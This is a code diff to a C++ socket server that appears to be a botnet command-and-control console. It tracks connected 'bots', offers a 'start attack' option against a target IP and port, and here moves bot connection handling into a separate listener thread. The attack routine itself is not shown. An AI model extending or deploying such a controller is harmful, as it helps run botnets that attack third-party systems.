@@ -18,6 +18,8 @@ char* attack = "None";
 string target_ip;
 
 vector<string> bots;
+thread tListener;
+vector<thread> threads;
 int target_port;
 int server_fd, valread, client_socket;
 struct sockaddr_in server_address, client_address;
@@ -78,8 +80,7 @@ void list_bots()
 void threaded(int i)
 {
 	char buffer[1024] = { 0 };	
-	char* hello = "Hello from server";
-	cout << "Client Socket File Descriptor: " << i << "\n";
+	cout << "\nClient Socket File Descriptor: " << i << "\n";
 
 	valread = read(i, buffer, 1024);
         cout << "\n" << buffer;
@@ -93,6 +94,26 @@ void threaded(int i)
 			break;
 		}
 	}	
+}
+
+void connection_listener(int i)
+{
+	while(bots.size() != 3)
+	{
+		socklen_t client_length = sizeof(client_address);
+		if ((client_socket = accept(server_fd, (struct sockaddr *) &client_address, &client_length)) < 0) {
+			perror("accept");
+			exit(EXIT_FAILURE);
+		}
+
+		bots.push_back(inet_ntoa(client_address.sin_addr));
+	
+		cout << "\nclient connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << bots.size() << endl;
+
+		threads.push_back(thread(threaded, client_socket));
+  		threads.back().detach();
+	}
+
 }
 
 
@@ -125,33 +146,14 @@ void start_server()
 		exit(EXIT_FAILURE);
 	}
 
-	cout << "Server started, waiting for client connections...\n";
-
 	// Wait for clients connections
 	if (listen(server_fd, 3) < 0) {
 		perror("listem");
 		exit(EXIT_FAILURE);
 	}
-
-	socklen_t client_length = sizeof(client_address);
-	if ((client_socket = accept(server_fd, (struct sockaddr *) &client_address, &client_length)) < 0) {
-		perror("accept");
-		exit(EXIT_FAILURE);
-	}
-
-	bots.push_back(inet_ntoa(client_address.sin_addr));
-	
-	cout << "client connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << bots.size() << endl;
-
-	sleep(5);
-
-	if (bots.size() == 1)
-	{
-		cout << client_socket;
-		thread t1(threaded, client_socket);
-		t1.detach();
-	}
-	
+        
+	tListener = thread(connection_listener, 1);
+	tListener.detach();
 	
 	char char_choice[1];
 	int int_choice = 0;
@@ -163,7 +165,8 @@ void start_server()
 		cout << "Server options: \n\n";
 		cout << "1. start attack\n";
 		cout << "2. list connected bots\n";
-		cout << "3. exit\n";
+		cout << "3. exit\n";	
+		cout << "\nServer started, waiting for client connections...\n";
 
 		cin >> char_choice;
 		int_choice = atoi(char_choice);
